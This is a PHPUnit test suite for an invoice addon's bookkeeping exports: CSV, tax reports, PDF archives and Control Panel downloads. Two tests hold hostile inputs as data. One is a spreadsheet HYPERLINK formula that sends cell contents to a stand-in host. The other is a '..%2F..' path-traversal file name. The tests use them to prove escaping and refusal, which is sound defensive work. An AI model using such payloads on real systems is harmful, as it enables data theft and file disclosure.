<?php

namespace Goldnead\Invoices\Tests\Feature;

use Goldnead\Invoices\Console\Commands\ExportInvoices;
use Goldnead\Invoices\Contracts\PdfRenderer;
use Goldnead\Invoices\Cp\Exports;
use Goldnead\Invoices\Export\ArchiveStore;
use Goldnead\Invoices\Export\CsvExport;
use Goldnead\Invoices\Export\CsvFormat;
use Goldnead\Invoices\Export\Period;
use Goldnead\Invoices\Export\TaxReport;
use Goldnead\Invoices\Jobs\BuildPdfArchive;
use Goldnead\Invoices\Models\Invoice;
use Goldnead\Invoices\Models\InvoiceItem;
use Goldnead\Invoices\Support\TaxResult;
use Goldnead\Invoices\Tests\TestCase;
use Illuminate\Contracts\Console\Kernel;
use Illuminate\Foundation\Http\Middleware\ValidateCsrfToken;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Storage;
use Inertia\ServiceProvider;
use PHPUnit\Framework\Attributes\Test;
use Statamic\Facades\User;
use Statamic\Facades\Utility;
use Symfony\Component\HttpFoundation\StreamedResponse;
use ZipArchive;

/**
 * The period, handed to whoever does the books.
 *
 * Three shapes of the same documents: a CSV a bookkeeping program imports, a
 * ZIP of the PDFs a tax office asks for, and a report that adds them up per
 * rule, country and rate. All three read the frozen rows and nothing else, so
 * the report of August says in December what it said in September.
 *
 * The documents are written straight into the table here rather than through
 * a payment. What is under test is the reading; the writing has its own tests,
 * and going through it would make every export test depend on the tax config.
 */
class ExportForTheBooksTest extends TestCase
{
    protected function defineEnvironment($app): void
    {
        parent::defineEnvironment($app);

        $app['config']->set('auth.providers.users.driver', 'statamic');

        // The front end's catch-all `{segments?}` is registered before any route a
        // test adds and would answer every one of them with a 404.
        $app['config']->set('statamic.routes.enabled', false);
        $app['config']->set('invoices.tax.merchant_country', 'DE');
    }

    /**
     * Inertia's provider, which the Control Panel's middleware stack leans on
     * and which testbench does not discover for a package.
     */
    protected function getPackageProviders($app): array
    {
        return [ServiceProvider::class, ...parent::getPackageProviders($app)];
    }

    protected function setUp(): void
    {
        parent::setUp();

        $this->app->make(Kernel::class)->registerCommand($this->app->make(ExportInvoices::class));
    }

    /**
     * @param  list<array{0: int, 1: int, 2: int, 3?: string|null, 4?: string|null}>  $zeilen  rate, net, tax, mechanism, place
     * @param  array<string, mixed>  $werte
     */
    private function beleg(string $nummer, string $datum, array $zeilen, array $werte = []): Invoice
    {
        $netto = array_sum(array_column($zeilen, 1));
        $steuer = array_sum(array_column($zeilen, 2));

        $rechnung = Invoice::create(array_merge([
            'number' => $nummer,
            'kind' => Invoice::KIND_INVOICE,
            'issued_at' => Carbon::parse($datum),
            'currency' => 'EUR',
            'buyer_name' => 'Bärbel Öztürk-Weiß',
            'buyer_email' => 'baerbel@example.com',
            'buyer_country' => 'DE',
            'net_cent' => $netto,
            'tax_cent' => $steuer,
            'gross_cent' => $netto + $steuer,
            'tax_reason' => 'Umsatzsteuer 19 %.',
        ], $werte));

        InvoiceItem::whileWriting(function () use ($rechnung, $zeilen) {
            foreach ($zeilen as $zeile) {
                $rechnung->items()->create([
                    'product' => 'kurs',
                    'name' => 'Chorleitungskurs',
                    'quantity' => 1,
                    'unit_net_cent' => $zeile[1],
                    'net_cent' => $zeile[1],
                    'tax_rate_bp' => $zeile[0],
                    'tax_cent' => $zeile[2],
                    'gross_cent' => $zeile[1] + $zeile[2],
                    'tax_mechanism' => array_key_exists(3, $zeile) ? $zeile[3] : TaxResult::MECHANISM_STANDARD,
                    'place_of_supply' => array_key_exists(4, $zeile) ? $zeile[4] : 'DE',
                ]);
            }
        });

        return $rechnung;
    }

    private function csv(Period $zeitraum, ?CsvFormat $format = null, ?int $marke = null): string
    {
        $strom = fopen('php://memory', 'w+');
        (new CsvExport($format ?? CsvFormat::default()))->write($strom, $zeitraum, $marke);
        rewind($strom);

        return (string) stream_get_contents($strom);
    }

    /** @return list<list<string>> */
    private function zeilen(string $csv, string $trenner = ';'): array
    {
        $csv = preg_replace('/^\xEF\xBB\xBF/', '', $csv);
        $zeilen = array_values(array_filter(preg_split('/\r\n|\n/', (string) $csv)));

        return array_map(fn ($z) => str_getcsv($z, $trenner, '"', ''), $zeilen);
    }

    // ── The period ──────────────────────────────────────────────────────────────

    #[Test]
    public function a_month_ends_at_midnight_in_the_sellers_own_time(): void
    {
        $this->beleg('RE-07', '2026-07-31 23:30', [[1900, 10000, 1900]]);
        $this->beleg('RE-08a', '2026-08-01 00:10', [[1900, 10000, 1900]]);
        $this->beleg('RE-08b', '2026-08-31 23:50', [[1900, 10000, 1900]]);
        $this->beleg('RE-09', '2026-09-01 00:05', [[1900, 10000, 1900]]);

        $nummern = array_column(array_slice($this->zeilen($this->csv(Period::month('2026-08'))), 1), 1);

        $this->assertSame(['RE-08a', 'RE-08b'], $nummern);
    }

    #[Test]
    public function a_period_is_read_from_what_a_person_types(): void
    {
        $this->assertSame('2026-07-01', Period::fromOptions(['quarter' => '2026-Q3'])->from->toDateString());
        $this->assertSame('2026-09-30', Period::fromOptions(['quarter' => '2026-Q3'])->to->toDateString());
        $this->assertSame('2026-12-31', Period::fromOptions(['year' => '2026'])->to->toDateString());
        $this->assertSame('2026-02-28', Period::fromOptions(['month' => '2026-02'])->to->toDateString());
        $this->assertSame('2026-08-15', Period::fromOptions(['from' => '2026-08-03', 'to' => '2026-08-15'])->to->toDateString());
    }

    #[Test]
    public function a_period_that_ends_before_it_starts_is_refused(): void
    {
        $this->expectException(\InvalidArgumentException::class);

        Period::fromOptions(['from' => '2026-08-15', 'to' => '2026-08-01']);
    }

    #[Test]
    public function a_month_that_does_not_exist_is_refused(): void
    {
        $this->expectException(\InvalidArgumentException::class);

        Period::fromOptions(['month' => '2026-13']);
    }

    // ── The CSV ─────────────────────────────────────────────────────────────────

    #[Test]
    public function one_row_per_document_and_rate(): void
    {
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900], [700, 1000, 70]]);

        $zeilen = $this->zeilen($this->csv(Period::month('2026-08')));

        $this->assertCount(3, $zeilen, 'Kopf und zwei Saetze');
        $kopf = $zeilen[0];
        $a = array_combine($kopf, $zeilen[1]);
        $b = array_combine($kopf, $zeilen[2]);

        $this->assertSame('10.08.2026', $a['Belegdatum']);
        $this->assertSame('19,00', $a['Steuersatz']);
        $this->assertSame('100,00', $a['Netto']);
        $this->assertSame('19,00', $a['Steuer']);
        $this->assertSame('119,00', $a['Brutto']);
        $this->assertSame('7,00', $b['Steuersatz']);
        $this->assertSame('10,70', $b['Brutto']);
        $this->assertSame('DE', $a['Leistungsort']);
    }

    #[Test]
    public function a_credit_note_takes_the_money_back_with_a_minus(): void
    {
        $original = $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]]);
        $this->beleg('RE-2', '2026-08-12 12:00', [[1900, 10000, 1900]], [
            'kind' => Invoice::KIND_CREDIT_NOTE,
            'reverses_invoice_id' => $original->id,
            'meta' => ['reverses_number' => 'RE-1'],
        ]);

        $zeilen = $this->zeilen($this->csv(Period::month('2026-08')));
        $storno = array_combine($zeilen[0], $zeilen[2]);

        $this->assertSame('Storno', $storno['Belegart']);
        $this->assertSame('RE-1', $storno['Bezug']);
        $this->assertSame('-100,00', $storno['Netto']);
        $this->assertSame('-19,00', $storno['Steuer']);
        $this->assertSame('-119,00', $storno['Brutto']);
    }

    #[Test]
    public function the_default_is_what_a_german_spreadsheet_opens(): void
    {
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]]);

        $csv = $this->csv(Period::month('2026-08'));

        $this->assertStringStartsWith("\xEF\xBB\xBF", $csv, 'UTF-8 mit BOM, sonst liest Excel die Umlaute falsch');
        $this->assertStringContainsString('Bärbel Öztürk-Weiß', $csv);
        $this->assertStringContainsString(';', $csv);
    }

    #[Test]
    public function windows_1252_for_the_programs_that_still_want_it(): void
    {
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]]);

        $csv = $this->csv(Period::month('2026-08'), CsvFormat::fromOptions(['encoding' => 'windows-1252']));

        $this->assertStringNotContainsString("\xEF\xBB\xBF", $csv);
        $this->assertStringContainsString("B\xE4rbel \xD6zt\xFCrk-Wei\xDF", $csv);
    }

    #[Test]
    public function comma_and_point_for_everything_else(): void
    {
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]], ['buyer_name' => 'Chor, e. V.']);

        $csv = $this->csv(Period::month('2026-08'), CsvFormat::fromOptions([
            'delimiter' => ',', 'decimal' => '.', 'encoding' => 'utf-8',
        ]));
        $zeilen = $this->zeilen($csv, ',');
        $zeile = array_combine($zeilen[0], $zeilen[1]);

        $this->assertSame('119.00', $zeile['Brutto']);
        $this->assertSame('Chor, e. V.', $zeile['Kunde'], 'ein Trennzeichen im Feld wird eingefasst, nicht geteilt');
    }

    #[Test]
    public function a_format_nobody_can_import_is_refused(): void
    {
        $this->expectException(\InvalidArgumentException::class);

        CsvFormat::fromOptions(['delimiter' => '|']);
    }

    #[Test]
    public function one_brand_at_a_time_when_asked(): void
    {
        $this->beleg('A-1', '2026-08-10 12:00', [[1900, 10000, 1900]], ['brand_id' => 1]);
        $this->beleg('B-1', '2026-08-10 12:00', [[1900, 10000, 1900]], ['brand_id' => 2]);

        $nummern = array_column(array_slice($this->zeilen($this->csv(Period::month('2026-08'), null, 2)), 1), 1);

        $this->assertSame(['B-1'], $nummern);
    }

    // ── The tax report ──────────────────────────────────────────────────────────

    #[Test]
    public function the_report_adds_up_per_rule_country_and_rate(): void
    {
        $this->beleg('RE-1', '2026-08-02 12:00', [[1900, 10000, 1900], [700, 1000, 70]]);
        $this->beleg('RE-2', '2026-08-03 12:00', [[2000, 5000, 1000, TaxResult::MECHANISM_STANDARD, 'AT']], ['buyer_country' => 'AT']);
        $this->beleg('RE-3', '2026-08-04 12:00', [[0, 20000, 0, TaxResult::MECHANISM_REVERSE_CHARGE, 'FR']], ['buyer_country' => 'FR', 'tax_zone' => 'eu-b2b']);
        $original = $this->beleg('RE-4', '2026-08-05 12:00', [[1900, 3000, 570]]);
        $this->beleg('RE-5', '2026-08-06 12:00', [[1900, 3000, 570]], [
            'kind' => Invoice::KIND_CREDIT_NOTE, 'reverses_invoice_id' => $original->id,
        ]);

        $bericht = TaxReport::for(Period::month('2026-08'));
        $zeile = fn (string $mech, string $land, int $satz) => collect($bericht->rows)
            ->first(fn ($r) => $r['mechanism'] === $mech && $r['country'] === $land && $r['rate_bp'] === $satz);

        $this->assertSame(10000, $zeile('standard', 'DE', 1900)['net'], 'die Stornierte hebt sich auf');
        $this->assertSame(1900, $zeile('standard', 'DE', 1900)['tax']);
        $this->assertSame(70, $zeile('standard', 'DE', 700)['tax']);
        $this->assertSame(1000, $zeile('standard', 'AT', 2000)['tax']);
        $this->assertSame(0, $zeile('reverse_charge', 'FR', 0)['tax']);
        $this->assertSame(20000, $zeile('reverse_charge', 'FR', 0)['net']);

        $this->assertSame(10000 + 1000 + 5000 + 20000, $bericht->totals['net']);
        $this->assertSame(1900 + 70 + 1000, $bericht->totals['tax']);
        $this->assertSame(5, $bericht->documents);
        $this->assertSame(0, $bericht->derived);
        $this->assertSame(1000, $bericht->ossTax(), 'nur was im Ausland geschuldet ist, gehoert in die OSS-Meldung');
    }

    #[Test]
    public function a_small_business_reports_turnover_and_no_tax(): void
    {
        $this->beleg('RE-1', '2026-08-02 12:00', [[0, 11900, 0, TaxResult::MECHANISM_SMALL_BUSINESS, 'DE']], [
            'tax_reason' => 'Gemäß § 19 UStG wird keine Umsatzsteuer berechnet.',
        ]);

        $bericht = TaxReport::for(Period::month('2026-08'));

        $this->assertCount(1, $bericht->rows);
        $this->assertSame('small_business', $bericht->rows[0]['mechanism']);
        $this->assertSame(11900, $bericht->rows[0]['net']);
        $this->assertSame(0, $bericht->rows[0]['tax']);
        $this->assertSame(0, $bericht->totals['tax']);
    }

    #[Test]
    public function a_line_from_before_the_columns_is_derived_and_counted_as_such(): void
    {
        $this->beleg('ALT-1', '2026-08-02 12:00', [[0, 11900, 0, null, null]], [
            'tax_reason' => 'Gemäß § 19 UStG wird keine Umsatzsteuer berechnet.',
        ]);
        $this->beleg('ALT-2', '2026-08-03 12:00', [[1900, 10000, 1900, null, null]]);
        $this->beleg('ALT-3', '2026-08-04 12:00', [[0, 5000, 0, null, null]], [
            'tax_zone' => 'eu-b2b', 'buyer_country' => 'AT', 'tax_reason' => 'Steuerschuldnerschaft des Leistungsempfängers.',
        ]);

        $bericht = TaxReport::for(Period::month('2026-08'));
        $mechanismen = collect($bericht->rows)->mapWithKeys(fn ($r) => [$r['mechanism'].'/'.$r['country'] => $r['net']])->all();

        $this->assertSame(11900, $mechanismen['small_business/DE']);
        $this->assertSame(10000, $mechanismen['standard/DE']);
        $this->assertSame(5000, $mechanismen['reverse_charge/AT']);
        $this->assertSame(3, $bericht->derived);
    }

    #[Test]
    public function an_empty_period_is_an_empty_report_not_an_error(): void
    {
        $bericht = TaxReport::for(Period::month('2026-08'));

        $this->assertSame([], $bericht->rows);
        $this->assertSame(0, $bericht->totals['gross']);
    }

    // ── The PDFs ────────────────────────────────────────────────────────────────

    private function fakePdf(): void
    {
        $this->app->bind(PdfRenderer::class, fn () => new class implements PdfRenderer
        {
            public function render(Invoice $invoice): string
            {
                return '%PDF-fake '.$invoice->number;
            }
        });
    }

    #[Test]
    public function the_archive_holds_one_pdf_per_document_of_the_period(): void
    {
        $this->fakePdf();
        Storage::fake('local');
        $this->beleg('RE2026-08-001', '2026-08-02 12:00', [[1900, 10000, 1900]]);
        $this->beleg('RE2026-08-002', '2026-08-03 12:00', [[1900, 10000, 1900]]);
        $this->beleg('RE2026-09-001', '2026-09-03 12:00', [[1900, 10000, 1900]]);

        (new BuildPdfArchive('2026-08-01', '2026-08-31', null))->handle();

        $dateien = Storage::disk('local')->files('invoices/exports');
        $this->assertCount(1, $dateien);

        $zip = new ZipArchive;
        $zip->open(Storage::disk('local')->path($dateien[0]));
        $namen = [];
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $namen[] = $zip->getNameIndex($i);
        }
        $this->assertSame(['RE2026-08-001.pdf', 'RE2026-08-002.pdf'], $namen);
        $this->assertSame('%PDF-fake RE2026-08-001', $zip->getFromName('RE2026-08-001.pdf'));
        $zip->close();
    }

    // ── The command ─────────────────────────────────────────────────────────────

    #[Test]
    public function the_command_writes_the_csv_to_a_file(): void
    {
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]]);
        $ziel = sys_get_temp_dir().'/invoices-export-'.bin2hex(random_bytes(4)).'.csv';

        $this->artisan('invoices:export', ['what' => 'csv', '--month' => '2026-08', '--output' => $ziel])
            ->assertSuccessful();

        $this->assertStringContainsString('RE-1', (string) file_get_contents($ziel));
        @unlink($ziel);
    }

    #[Test]
    public function the_command_prints_the_report(): void
    {
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]]);

        $this->artisan('invoices:export', ['what' => 'report', '--month' => '2026-08'])
            ->expectsOutputToContain('19 %')
            ->assertSuccessful();
    }

    #[Test]
    public function the_command_builds_the_archive(): void
    {
        $this->fakePdf();
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]]);
        $ziel = sys_get_temp_dir().'/invoices-export-'.bin2hex(random_bytes(4)).'.zip';

        $this->artisan('invoices:export', ['what' => 'pdf', '--month' => '2026-08', '--output' => $ziel])
            ->assertSuccessful();

        $zip = new ZipArchive;
        $this->assertTrue($zip->open($ziel) === true);
        $this->assertSame(1, $zip->numFiles);
        $zip->close();
        @unlink($ziel);
    }

    #[Test]
    public function the_command_refuses_a_period_it_cannot_read(): void
    {
        $this->artisan('invoices:export', ['what' => 'csv', '--month' => 'August'])
            ->assertFailed();
    }

    // ── The Control Panel ───────────────────────────────────────────────────────

    /**
     * The utility's routes, registered the way core registers them.
     *
     * The one line of Statamic's CP route file that matters here is repeated:
     * `Utility::routes()` inside the `statamic.cp.` name prefix, under a prefix
     * of its own. Under `cp/` core's catch-all answers first in a package test
     * bench, and core's own CP middleware (login redirect, `access cp`) is
     * core's to test. What is proved is the part this addon owns: the
     * controllers behind `can:access invoice-exports utility`.
     */
    private function cpRouten(): void
    {
        Route::middleware('web')->prefix('pruefstand')->name('statamic.cp.')->group(fn () => Utility::routes());
        $this->app['router']->getRoutes()->refreshNameLookups();
    }

    private function chefin()
    {
        return User::make()->id('chefin')->email('chefin@example.com')->makeSuper();
    }

    #[Test]
    public function the_cp_streams_the_csv_to_someone_allowed_to_see_it(): void
    {
        $this->cpRouten();
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]]);

        $antwort = $this->actingAs($this->chefin())
            ->get(cp_route('utilities.invoice-exports.csv', ['from' => '2026-08-01', 'to' => '2026-08-31']));

        $antwort->assertOk();
        $this->assertInstanceOf(StreamedResponse::class, $antwort->baseResponse);
        $this->assertStringContainsString('attachment', (string) $antwort->headers->get('content-disposition'));
        $this->assertStringContainsString('RE-1', $antwort->streamedContent());
    }

    #[Test]
    public function the_cp_refuses_a_user_without_the_utility(): void
    {
        $this->cpRouten();
        $jemand = User::make()->id('jemand')->email('jemand@example.com');

        $this->actingAs($jemand)
            ->get(cp_route('utilities.invoice-exports.csv', ['month' => '2026-08']))
            ->assertForbidden();

        $this->actingAs($jemand)
            ->post(cp_route('utilities.invoice-exports.archive'), ['month' => '2026-08'])
            ->assertForbidden();
    }

    #[Test]
    public function the_cp_queues_the_archive_rather_than_building_it_in_the_request(): void
    {
        $this->cpRouten();
        Queue::fake();
        Storage::fake('local');

        $this->withoutMiddleware(ValidateCsrfToken::class)
            ->actingAs($this->chefin())
            ->post(cp_route('utilities.invoice-exports.archive'), ['from' => '2026-08-01', 'to' => '2026-08-31'])
            ->assertRedirect();

        Queue::assertPushed(BuildPdfArchive::class);
    }

    #[Test]
    public function the_cp_hands_out_a_finished_archive_and_nothing_beside_it(): void
    {
        $this->cpRouten();
        Storage::fake('local');
        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31.zip', 'PK');
        Storage::disk('local')->put('geheim.txt', 'nein');

        $this->actingAs($this->chefin())
            ->get(cp_route('utilities.invoice-exports.download', ['file' => 'Belege_2026-08-01_2026-08-31.zip']))
            ->assertOk();

        $this->actingAs($this->chefin())
            ->get(cp_route('utilities.invoice-exports.download', ['file' => '..%2F..%2Fgeheim.txt']))
            ->assertNotFound();
    }

    #[Test]
    public function the_screen_shows_the_report_of_the_period_it_was_asked_for(): void
    {
        $this->cpRouten();
        Storage::fake('local');
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]]);

        $daten = app(Exports::class)(Request::create('/', 'GET', ['month' => '2026-08']));
        $html = view('invoices::cp.exports', $daten)->render();

        $this->assertStringContainsString('01.08.2026', $html);
        $this->assertStringContainsString('100,00', $html);
        $this->assertStringContainsString('19,00', $html);
    }

    #[Test]
    public function the_screen_says_what_an_empty_period_means(): void
    {
        $this->cpRouten();
        Storage::fake('local');

        $daten = app(Exports::class)(Request::create('/', 'GET', ['month' => '2026-08']));
        $html = view('invoices::cp.exports', $daten)->render();

        $this->assertStringContainsString(__('invoices::exports.report_empty'), $html);
    }

    #[Test]
    public function the_screen_names_a_period_it_could_not_read_instead_of_falling_back_quietly(): void
    {
        $this->cpRouten();
        Storage::fake('local');

        $daten = app(Exports::class)(Request::create('/', 'GET', ['from' => '2026-08-15', 'to' => '2026-08-01']));
        $html = view('invoices::cp.exports', $daten)->render();

        $this->assertNotNull($daten['error']);
        $this->assertStringContainsString($daten['error'], $html);
    }

    // ── Gauntlet, round 2 ───────────────────────────────────────────────────────

    /**
     * A brand-context manager that runs several brands and is looking at one.
     */
    private function markeAktiv(int $id): void
    {
        $this->app->instance('brand-context', new class($id)
        {
            public function __construct(private int $id) {}

            public function multiBrandEnabled(): bool
            {
                return true;
            }

            public function currentId(): int
            {
                return $this->id;
            }

            public function current(): object
            {
                return (object) ['id' => $this->id, 'name' => 'Marke '.$this->id];
            }
        });
    }

    #[Test]
    public function a_cell_that_a_spreadsheet_would_run_is_written_as_text(): void
    {
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]], [
            'buyer_name' => '=HYPERLINK("https://boese.example/?d="&A1;"Rechnung")',
            'buyer_email' => '+49@example.com',
            'buyer_vat_id' => '-DE123',
        ]);
        $original = Invoice::query()->where('number', 'RE-1')->first();
        $this->beleg('RE-2', '2026-08-11 12:00', [[1900, 10000, 1900]], [
            'kind' => Invoice::KIND_CREDIT_NOTE,
            'reverses_invoice_id' => $original->id,
            'meta' => ['reverses_number' => '@SUM(1+1)'],
            'buyer_name' => "\tTab",
        ]);

        $zeilen = $this->zeilen($this->csv(Period::month('2026-08')));
        $a = array_combine($zeilen[0], $zeilen[1]);
        $b = array_combine($zeilen[0], $zeilen[2]);

        $this->assertSame("'=HYPERLINK(\"https://boese.example/?d=\"&A1;\"Rechnung\")", $a['Kunde']);
        $this->assertSame("'+49@example.com", $a['E-Mail']);
        $this->assertSame("'-DE123", $a['USt-IdNr.']);
        $this->assertSame("'@SUM(1+1)", $b['Bezug']);
        $this->assertSame("'\tTab", $b['Kunde']);
        $this->assertSame('-100,00', $b['Netto'], 'Betraege bleiben Zahlen, auch mit Minus');
    }

    #[Test]
    public function names_outside_windows_1252_are_spelled_in_latin_whatever_the_locale(): void
    {
        $vorher = setlocale(LC_ALL, '0');
        setlocale(LC_ALL, 'C');

        try {
            $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]], ['buyer_name' => 'Łukasz Żółć']);
            $this->beleg('RE-2', '2026-08-11 12:00', [[1900, 10000, 1900]], ['buyer_name' => 'Ağaoğlu Müller']);

            $csv = $this->csv(Period::month('2026-08'), CsvFormat::fromOptions(['encoding' => 'windows-1252']));
        } finally {
            setlocale(LC_ALL, (string) $vorher);
        }

        $this->assertStringContainsString("Lukasz Z\xF3lc", $csv, 'o mit Akut gibt es in Windows-1252, der Rest wird lateinisch');
        $this->assertStringContainsString("Agaoglu M\xFCller", $csv);
        $this->assertStringNotContainsString('?', $csv);
    }

    #[Test]
    public function the_csv_follows_the_invoice_date_not_the_order_of_writing(): void
    {
        $this->beleg('RE-B', '2026-08-20 12:00', [[1900, 10000, 1900]]);
        $this->beleg('RE-A', '2026-08-05 12:00', [[1900, 10000, 1900]]);

        $nummern = array_column(array_slice($this->zeilen($this->csv(Period::month('2026-08'))), 1), 1);

        $this->assertSame(['RE-A', 'RE-B'], $nummern);
    }

    #[Test]
    public function the_brand_column_names_the_brand(): void
    {
        Schema::create('brands', function ($t) {
            $t->id();
            $t->string('handle');
            $t->string('name');
            $t->timestamps();
        });
        DB::table('brands')->insert(['id' => 2, 'handle' => 'chorwerk', 'name' => 'Chorwerkstatt Nord']);
        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]], ['brand_id' => 2]);

        $zeilen = $this->zeilen($this->csv(Period::month('2026-08')));

        $this->assertSame('Chorwerkstatt Nord', array_combine($zeilen[0], $zeilen[1])['Marke']);
    }

    #[Test]
    public function the_screen_lists_the_archives_of_its_own_brand_only(): void
    {
        $this->cpRouten();
        Storage::fake('local');
        $this->markeAktiv(2);
        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31_marke-2.zip', 'PK');
        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31_marke-3.zip', 'PK');
        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31.zip', 'PK');

        $daten = app(Exports::class)(Request::create('/', 'GET', ['month' => '2026-08']));

        $this->assertSame(['Belege_2026-08-01_2026-08-31_marke-2.zip'], array_column($daten['archives']['ready'], 'name'));
    }

    #[Test]
    public function another_brands_archive_is_not_there(): void
    {
        $this->cpRouten();
        Storage::fake('local');
        $this->markeAktiv(2);
        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31_marke-3.zip', 'PK');
        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31_marke-2.zip', 'PK');

        $this->actingAs($this->chefin())
            ->get(cp_route('utilities.invoice-exports.download', ['file' => 'Belege_2026-08-01_2026-08-31_marke-3.zip']))
            ->assertNotFound();

        $this->actingAs($this->chefin())
            ->get(cp_route('utilities.invoice-exports.download', ['file' => 'Belege_2026-08-01_2026-08-31_marke-2.zip']))
            ->assertOk();
    }

    #[Test]
    public function the_file_name_says_which_brand_it_belongs_to(): void
    {
        $this->cpRouten();
        $this->markeAktiv(2);

        $antwort = $this->actingAs($this->chefin())
            ->get(cp_route('utilities.invoice-exports.csv', ['month' => '2026-08']));

        $this->assertStringContainsString('Belege_2026-08-01_2026-08-31_marke-2.csv', (string) $antwort->headers->get('content-disposition'));

        $bericht = $this->actingAs($this->chefin())
            ->get(cp_route('utilities.invoice-exports.report', ['month' => '2026-08']));

        $this->assertStringContainsString('Steuerbericht_2026-08-01_2026-08-31_marke-2.csv', (string) $bericht->headers->get('content-disposition'));
    }

    #[Test]
    public function the_report_and_the_download_refuse_a_user_without_the_utility_too(): void
    {
        $this->cpRouten();
        Storage::fake('local');
        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31.zip', 'PK');
        $jemand = User::make()->id('jemand')->email('jemand@example.com');

        $this->actingAs($jemand)
            ->get(cp_route('utilities.invoice-exports.report', ['month' => '2026-08']))
            ->assertForbidden();

        $this->actingAs($jemand)
            ->get(cp_route('utilities.invoice-exports.download', ['file' => 'Belege_2026-08-01_2026-08-31.zip']))
            ->assertForbidden();
    }

    #[Test]
    public function a_job_the_worker_gave_up_on_is_shown_as_failed(): void
    {
        Storage::fake('local');

        (new BuildPdfArchive('2026-08-01', '2026-08-31', null))->failed(new \RuntimeException('Zeit abgelaufen'));

        $liste = ArchiveStore::make()->listing(null);

        $this->assertSame([], $liste['pending']);
        $this->assertSame('Belege_2026-08-01_2026-08-31.zip', $liste['failed'][0]['name']);
        $this->assertStringContainsString('Zeit abgelaufen', $liste['failed'][0]['reason']);
    }

    #[Test]
    public function a_marker_older_than_the_job_may_run_is_shown_as_failed(): void
    {
        Storage::fake('local');
        Storage::disk('local')->put(
            'invoices/exports/Belege_2026-08-01_2026-08-31.zip.pending',
            now()->subSeconds((new BuildPdfArchive('2026-08-01', '2026-08-31'))->timeout + 60)->toIso8601String(),
        );
        Storage::disk('local')->put('invoices/exports/Belege_2026-07-01_2026-07-31.zip.pending', now()->toIso8601String());

        $liste = ArchiveStore::make()->listing(null);

        $this->assertSame(['Belege_2026-07-01_2026-07-31.zip'], $liste['pending']);
        $this->assertSame('Belege_2026-08-01_2026-08-31.zip', $liste['failed'][0]['name']);
    }
}
